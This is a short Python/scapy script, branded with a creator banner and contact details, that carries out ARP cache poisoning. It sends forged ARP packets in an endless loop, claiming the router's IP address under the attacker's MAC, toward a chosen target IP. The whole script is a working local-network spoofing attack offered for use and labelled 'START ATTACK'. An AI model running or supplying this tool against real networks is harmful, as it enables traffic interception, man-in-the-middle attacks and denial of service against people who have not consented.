#!/usr/bin/python


#///////////bANNER
"""
          __        _______ _     ____ ___  __  __ _____ 
          \ \      / / ____| |   / ___/ _ \|  \/  | ____|
           \ \ /\ / /|  _| | |  | |  | | | | |\/| |  _|  
            \ V  V / | |___| |__| |__| |_| | |  | | |___  _   _   _ 
             \_/\_/  |_____|_____\____\___/|_|  |_|_____|(_| |_| |_)
                                               
                        Script Crearor: 
     _   _    _____ _    ____    _____  ___     ___    _   _    _    
    | | / \  |  ___/ \  |  _ \  |_   _|/ \ \   / / \  | \ | |  / \   
 _  | |/ _ \ | |_ / _ \ | |_) |   | | / _ \ \ / / _ \ |  \| | / _ \  
| |_| / ___ \|  _/ ___ \|  _ <    | |/ ___ \ V / ___ \| |\  |/ ___ \ 
 \___/_/   \_\_|/_/   \_\_| \_\   |_/_/   \_\_/_/   \_\_| \_/_/   \_\
                                                                     
Tell:  +989170118221   		  Mail: PowerInfoSSL@Gmail.com
"""
##




from scapy.all import *
import sys,os

print '\n\nUsage [Appname] [Your MAC] [Destination IP] [Router IP Address]\n\n\n      START ATTACK\n\n\n'
if len(sys.argv)!=4:
	print '[-] Please Enter [Appname] [Your MAC] [Destination IP] [Router IP Address]'
	sys.exit(0)
p=Ether()/ARP(op='who-has',hwsrc=sys.argv[1],psrc=sys.argv[3],pdst=sys.argv[2])

while True:
	sendp(p)
